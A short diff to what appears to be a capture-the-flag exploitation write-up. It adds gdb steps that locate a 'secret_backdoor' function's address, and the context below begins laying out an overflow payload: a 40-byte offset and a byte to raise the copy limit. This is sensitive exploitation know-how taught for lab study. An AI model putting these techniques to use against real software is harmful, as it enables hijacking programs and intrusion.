@@ -234,6 +234,16 @@ Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RU
 
 ### Building the exploit
 
+```shell
+(gdb) b main
+(gdb) run
+(gdb) lay n
+...
+0x55555555488c <secret_backdoor>        push   %rbp                     
+...
+```
+- The address of secret_backdoor is `0x55555555488c`
+
 ```
 40 bytes of offset +
 1 '0xff' byte to increase the limit of copied bytes + "\n" +
